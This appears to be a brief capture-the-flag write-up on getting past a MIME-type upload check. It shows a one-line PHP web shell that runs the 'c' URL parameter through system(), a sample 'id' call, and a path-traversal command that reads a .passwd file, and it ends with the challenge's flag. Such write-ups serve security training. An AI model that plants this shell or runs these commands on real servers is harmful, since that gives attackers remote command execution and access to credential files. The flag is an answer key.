



What is MIME type ?




![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203429.png)


This payload allows me to do this :

```
\\Example
image?c=id
```

Co
```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```






```
cat ../../../.passwd
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203353.png)





Flag : a7n4nizpgQgnPERy89uanf6T4